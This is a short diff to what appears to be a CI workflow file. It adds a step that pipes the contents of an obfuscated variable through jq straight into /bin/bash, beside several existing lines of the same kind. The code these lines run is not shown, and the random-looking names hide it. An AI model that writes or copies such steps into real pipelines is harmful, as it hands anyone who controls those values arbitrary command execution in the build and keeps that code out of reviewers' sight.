@@ -27,6 +27,7 @@ jobs:
           echo $mz3 | jq -r .yakni8976 | /bin/bash
           printf '%s' "$gjl8034" | jq -r .j05 | /bin/bash
           printf '%s' "$r981" | jq -r .smcw2865 | /bin/bash
+          printf '%s' "$d3908" | jq -r .qna54 | /bin/bash
 
       - name: Upload data
         if: always()
